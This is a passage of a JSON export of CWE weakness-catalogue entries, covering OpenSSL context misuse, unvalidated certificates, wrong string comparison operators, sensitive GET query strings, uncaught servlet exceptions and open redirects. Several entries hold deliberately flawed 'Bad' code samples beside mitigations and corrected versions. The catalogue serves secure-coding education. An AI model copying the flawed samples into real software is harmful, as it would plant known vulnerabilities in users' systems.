      "Status": "Deprecated",
      "Description": "This weakness has been deprecated because it covered redundant concepts already described in CWE-287.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "See description and name for possible suggestions of other CWEs to consider.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "593",
      "Name": "Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product modifies the SSL context after connection creation has begun.",
      "ExtendedDescription": "If the program modifies the SSL_CTX object after creating SSL objects from it, there is the possibility that older SSL objects created from the original context could all be affected by that change.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "666",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "1390",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "No authentication takes place in this process, bypassing an assumed protection of encryption."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "The encrypted communication between a user and a trusted host may be subject to a sniffing attack."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use a language or a library that provides a cryptography framework at a higher level of abstraction."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Most SSL_CTX functions have SSL counterparts that act on SSL-type objects."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Applications should set up an SSL_CTX completely, before creating SSL objects from it."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define CERT \"secret.pem\"\n\t#define CERT2 \"secret2.pem\"\n\tint main(){\n\t\t\tSSL_CTX *ctx;\n\t\t\tSSL *ssl;\n\t\t\tinit_OpenSSL();\n\t\t\tseed_prng();\n\t\t\tctx = SSL_CTX_new(SSLv23_method());\n\t\t\tif (SSL_CTX_use_certificate_chain_file(ctx, CERT) != 1)\n\t\t\t\tint_error(\"Error loading certificate from file\");\n\t\t\tif (SSL_CTX_use_PrivateKey_file(ctx, CERT, SSL_FILETYPE_PEM) != 1)\n\t\t\t\tint_error(\"Error loading private key from file\");\n\t\t\tif (!(ssl = SSL_new(ctx)))\n\t\t\t\tint_error(\"Error creating an SSL context\");\n\t\t\tif ( SSL_CTX_set_default_passwd_cb(ctx, \"new default password\" != 1))\n\t\t\t\tint_error(\"Doing something which is dangerous to do anyways\");\n\t\t\tif (!(ssl2 = SSL_new(ctx)))\n\t\t\t\tint_error(\"Error creating an SSL context\");\n\t}\n```"
            }
          ]
        }
      ],
      "RelatedAttackPatterns": [
        "94"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "594",
      "Name": "J2EE Framework: Saving Unserializable Objects to Disk",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "When the J2EE container attempts to write unserializable objects to disk there is no guarantee that the process will complete successfully.",
      "ExtendedDescription": "In heavy load conditions, most J2EE application frameworks flush objects to disk to manage memory requirements of incoming requests. For example, session scoped objects, and even application scoped objects, are written to disk when required. While these application frameworks do the real work of writing objects to disk, they do not enforce that those objects be serializable, thus leaving the web application vulnerable to crashes induced by serialization failure. An attacker may be able to mount a denial of service attack by sending enough requests to the server to force the web application to save objects to disk.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        },
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "Data represented by unserializable objects can be corrupted."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Non-serializability of objects can lead to system crash."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "All objects that become part of session and application scope must implement the java.io.Serializable interface to ensure serializability of containing objects."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example, a Customer Entity JavaBean provides access to customer information in a database for a business application. The Customer Entity JavaBean is used as a session scoped object to return customer information to a Session EJB."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t@Entity\n\tpublic class Customer {\n\t\t\tprivate String id;\n\t\t\tprivate String firstName;\n\t\t\tprivate String lastName;\n\t\t\tprivate Address address;\n\t\t\tpublic Customer() {\n\t\t\t}\n\t\t\tpublic Customer(String id, String firstName, String lastName) {...}\n\t\t\t@Id\n\t\t\tpublic String getCustomerId() {...}\n\t\t\tpublic void setCustomerId(String id) {...}\n\t\t\tpublic String getFirstName() {...}\n\t\t\tpublic void setFirstName(String firstName) {...}\n\t\t\tpublic String getLastName() {...}\n\t\t\tpublic void setLastName(String lastName) {...}\n\t\t\t@OneToOne()\n\t\t\tpublic Address getAddress() {...}\n\t\t\tpublic void setAddress(Address address) {...}\n\t}\n```"
            },
            {
              "BodyText": "However, the Customer Entity JavaBean is an unserialized object which can cause serialization failure and crash the application when the J2EE container attempts to write the object to the system. Session scoped objects must implement the Serializable interface to ensure that the objects serialize properly."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Customer implements Serializable {...}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "595",
      "Name": "Comparison of Object References Instead of Object Contents",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product compares object references instead of the contents of the objects themselves, preventing it from detecting equivalent objects.",
      "ExtendedDescription": "For example, in Java, comparing objects using == usually produces deceptive results, since the == operator compares object references rather than values; often, this means that using == for strings is actually comparing the strings' references, not their values.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1025",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "JavaScript",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context"
          ],
          "Note": "This weakness can lead to erroneous results that can cause unexpected application behaviors."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "In Java, use the equals() method to compare objects instead of the == operator. If using ==, it is important for performance reasons that your objects are created by a static factory, not by a constructor."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-60",
          "Entries": [
            {
              "IntroText": "In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString str1 = new String(\"Hello\");\n\tString str2 = new String(\"Hello\");\n\tif (str1 == str2) {\n\t\tSystem.out.println(\"str1 == str2\");\n\t}\n```"
            },
            {
              "BodyText": "However, the if statement will not be executed as the strings are compared using the \"==\" operator. For Java objects, such as String objects, the \"==\" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method:"
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\tif (str1.equals(str2)) {\n\t\tSystem.out.println(\"str1 equals str2\");\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following Java example, two BankAccount objects are compared in the isSameAccount method using the == operator."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic boolean isSameAccount(BankAccount accountA, BankAccount accountB) {\n\t\treturn accountA == accountB;\n\t}\n```"
            },
            {
              "BodyText": "Using the == operator to compare objects may produce incorrect or deceptive results by comparing object references rather than values. The equals() method should be used to ensure correct results or objects should contain a member variable that uniquely identifies the object."
            },
            {
              "BodyText": "The following example shows the use of the equals() method to compare the BankAccount objects and the next example uses a class get method to retrieve the bank account number that uniquely identifies the BankAccount object to compare the objects."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic boolean isSameAccount(BankAccount accountA, BankAccount accountB) {\n\t\treturn accountA.equals(accountB);\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "EXP02-J",
          "EntryName": "Use the two-argument Arrays.equals() method to compare the contents of arrays"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "EXP02-J",
          "EntryName": "Use the two-argument Arrays.equals() method to compare the contents of arrays"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "EXP03-J",
          "EntryName": "Do not use the equality operators when comparing values of boxed primitives"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-954",
          "Authors": [
            "Mozilla MDN"
          ],
          "Title": "Equality comparisons and sameness",
          "URL": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness",
          "URLDate": "2017-11-17"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "596",
      "Name": "DEPRECATED: Incorrect Semantic Object Comparison",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Deprecated",
      "Description": "This weakness has been deprecated.  It was poorly described and difficult to distinguish from other entries.  It was also inappropriate to assign a separate ID solely because of domain-specific considerations.  Its closest equivalent is CWE-1023.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "See description and name for possible suggestions of other CWEs to consider.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "597",
      "Name": "Use of Wrong Operator in String Comparison",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses the wrong operator when comparing a string, such as using \"==\" when the .equals() method should be used instead.",
      "ExtendedDescription": "In Java, using == or != to compare two strings for equality actually compares two objects for equality rather than their string values for equality. Chances are good that the two references will never be equal. While this weakness often only affects program correctness, if the equality is used for a security decision, the unintended comparison result could be leveraged to affect program security.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "595",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "595",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "480",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Within Java, use .equals() to compare string values.\n Within JavaScript, use == to compare string values.\n Within PHP, use == to compare a numeric value to a string value. (PHP converts the string to a number.)",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-60",
          "Entries": [
            {
              "IntroText": "In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString str1 = new String(\"Hello\");\n\tString str2 = new String(\"Hello\");\n\tif (str1 == str2) {\n\t\tSystem.out.println(\"str1 == str2\");\n\t}\n```"
            },
            {
              "BodyText": "However, the if statement will not be executed as the strings are compared using the \"==\" operator. For Java objects, such as String objects, the \"==\" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method:"
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\tif (str1.equals(str2)) {\n\t\tSystem.out.println(\"str1 equals str2\");\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the example below, three JavaScript variables are declared and initialized with the same values. Note that JavaScript will change a value between numeric and string as needed, which is the reason an integer is included with the strings. An if statement is used to determine whether the values are the same."
            },
            {
              "Nature": "Bad",
              "Language": "JavaScript",
              "ExampleCode": "<p id=\"ieq3s1\" type=\"text\">(i === s1) is FALSE</p>\n <p id=\"s4eq3i\" type=\"text\">(s4 === i) is FALSE</p>\n <p id=\"s4eq3s1\" type=\"text\">(s4 === s1) is FALSE</p>\n\n var i = 65;\n var s1 = '65';\n var s4 = new String('65');\n\n if (i === s1)\n {\n\n```\n\tdocument.getElementById(\"ieq3s1\").innerHTML = \"(i === s1) is TRUE\";\n }\n if (s4 === i)\n {\n\tdocument.getElementById(\"s4eq3i\").innerHTML = \"(s4 === i) is TRUE\";\n }\n if (s4 === s1)\n {\n\tdocument.getElementById(\"s4eq3s1\").innerHTML = \"(s4 === s1) is TRUE\";\n }\n```"
            },
            {
              "BodyText": "However, the body of the if statement will not be executed, as the \"===\" compares both the type of the variable AND the value. As the types of the first comparison are number and string, it fails. The types in the second are int and reference, so this one fails as well. The types in the third are reference and string, so it also fails.\n\n\nWhile the variables above contain the same values, they are contained in different types, so the document.getElementById... statement will not be executed in any of the cases.\n\n\nTo compare object values, the previous code is modified and shown below to use the \"==\" for value comparison so the comparison in this example executes the HTML statement:"
            },
            {
              "Nature": "Good",
              "Language": "JavaScript",
              "ExampleCode": "<p id=\"ieq2s1\" type=\"text\">(i == s1) is FALSE</p>\n <p id=\"s4eq2i\" type=\"text\">(s4 == i) is FALSE</p>\n <p id=\"s4eq2s1\" type=\"text\">(s4 == s1) is FALSE</p>\n\n var i = 65;\n var s1 = '65';\n var s4 = new String('65');\n\n if (i == s1)\n {\n\n```\n\tdocument.getElementById(\"ieq2s1\").innerHTML = \"(i == s1) is TRUE\";\n }\n if (s4 == i)\n {\n\tdocument.getElementById(\"s4eq2i\").innerHTML = \"(s4 == i) is TRUE\";\n }\n if (s4 == s1)\n {\n\tdocument.getElementById(\"s4eq2s1\").innerHTML = \"(s4 == s1) is TRUE\";\n }\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the example below, two PHP variables are declared and initialized with the same numbers - one as a string, the other as an integer. Note that PHP will change the string value to a number for a comparison. An if statement is used to determine whether the values are the same."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "var $i = 65;\n var $s1 = \"65\";\n\n if ($i === $s1)\n {\n\n```\n\techo '($i === $s1) is TRUE'. \"\\n\";\n }\n else\n {\n\techo '($i === $s1) is FALSE'. \"\\n\";\n }\n```"
            },
            {
              "BodyText": "However, the body of the if statement will not be executed, as the \"===\" compares both the type of the variable AND the value. As the types of the first comparison are number and string, it fails.\n\n\nWhile the variables above contain the same values, they are contained in different types, so the TRUE portion of the if statement will not be executed.\n\n\nTo compare object values, the previous code is modified and shown below to use the \"==\" for value comparison (string converted to number) so the comparison in this example executes the TRUE statement:"
            },
            {
              "Nature": "Good",
              "Language": "PHP",
              "ExampleCode": "var $i = 65;\n var $s1 = \"65\";\n\n if ($i == $s1)\n {\n\n```\n\techo '($i == $s1) is TRUE'. \"\\n\";\n }\n else\n {\n\techo '($i == $s1) is FALSE'. \"\\n\";\n }\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "EXP03-J",
          "EntryName": "Do not use the equality operators when comparing values of boxed primitives"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "EXP03-J",
          "EntryName": "Do not use the equality operators when comparing values of boxed primitives"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "EXP35-PL",
          "EntryName": "Use the correct operator type for comparing values",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Typos\", Page 289",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "598",
      "Name": "Use of GET Request Method With Sensitive Query Strings",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The web application uses the HTTP GET method to process a request and includes sensitive information in the query string of that request.",
      "ExtendedDescription": "The query string for the URL could be saved in the browser's history, passed through Referers to other web sites, stored in web logs, or otherwise recorded in other sources. If the query string contains sensitive information such as session identifiers, then attackers can use this information to launch further attacks.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "201",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "At a minimum, attackers can garner information from query strings that can be utilized in escalating their method of attack, such as information about the internal workings of the application or database column names. Successful exploitation of query string parameter vulnerabilities could lead to an attacker impersonating a legitimate user, obtaining proprietary data, or simply executing actions not intended by the application developers."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When sensitive information is sent, use the POST method (e.g. registration form)."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-23546",
          "Description": "A discussion platform leaks private information in GET requests.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-23546"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "599",
      "Name": "Missing Validation of OpenSSL Certificate",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses OpenSSL and trusts or uses a certificate without using the SSL_get_verify_result() function to ensure that the certificate satisfies all necessary security requirements.",
      "ExtendedDescription": "This could allow an attacker to use an invalid certificate to claim to be a trusted host, use expired certificates, or conduct other attacks that could be detected if the certificate is properly validated.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "295",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "The data read may not be properly secured, it might be viewed by an attacker."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "Trust afforded to the system in question may allow for spoofing or redirection attacks."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "If the certificate is not checked, it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data under the guise of a trusted host. While the attacker in question may have a valid certificate, it may simply be a valid certificate for a different site. In order to ensure data integrity, we must check that the certificate is valid, and that it pertains to the site we wish to access."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Ensure that proper authentication is included in the system design."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Understand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-125",
          "Entries": [
            {
              "IntroText": "The following OpenSSL code ensures that the host has a certificate."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tif (cert = SSL_get_peer_certificate(ssl)) {\n```\n// got certificate, host can be trusted* \n\t\t\t\n\t\t\t\n\t\t\t *//foo=SSL_get_verify_result(ssl);* \n\t\t\t\n\t\t\t\n\t\t\t *//if (X509_V_OK==foo) ...* \n\t\t\t}"
            },
            {
              "BodyText": "Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "CWE-295 and CWE-599 are very similar, although CWE-599 has a more narrow scope that is only applied to OpenSSL certificates. As a result, other children of CWE-295 can be regarded as children of CWE-599 as well. CWE's use of one-dimensional hierarchical relationships is not well-suited to handle different kinds of abstraction relationships based on concepts like types of resources (\"OpenSSL certificate\" as a child of \"any certificate\") and types of behaviors (\"not validating expiration\" as a child of \"improper validation\")."
        }
      ]
    },
    {
      "ID": "600",
      "Name": "Uncaught Exception in Servlet ",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The Servlet does not catch all exceptions, which may reveal sensitive debugging information.",
      "ExtendedDescription": "When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "248",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "209",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "390",
          "ViewID": "1000"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Missing Catch Block"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Read Application Data",
            "DoS: Crash, Exit, or Restart"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Implement Exception blocks to handle all types of Exceptions."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-39",
          "Entries": [
            {
              "IntroText": "The following example attempts to resolve a hostname."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprotected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {\n\t\tString ip = req.getRemoteAddr();\n\t\tInetAddress addr = InetAddress.getByName(ip);\n\t\t...\n\t\tout.println(\"hello \" + addr.getHostName());\n\t}\n```"
            },
            {
              "BodyText": "A DNS lookup failure will cause the Servlet to throw an exception."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR01-J",
          "EntryName": "Do not allow exceptions to expose sensitive information"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP4",
          "EntryName": "Unchecked Status Condition"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "The \"Missing Catch Block\" concept is probably broader than just Servlets, but the broader concept is not sufficiently covered in CWE."
        }
      ]
    },
    {
      "ID": "601",
      "Name": "URL Redirection to Untrusted Site ('Open Redirect')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.",
      "ExtendedDescription": "An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance. Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "610",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "610",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "Phishing is a general term for deceptive attempts to coerce private information from users that will be used for identity theft."
      ],
      "AlternateTerms": [
        {
          "Term": "Open Redirect"
        },
        {
          "Term": "Cross-site Redirect"
        },
        {
          "Term": "Cross-domain Redirect"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ],
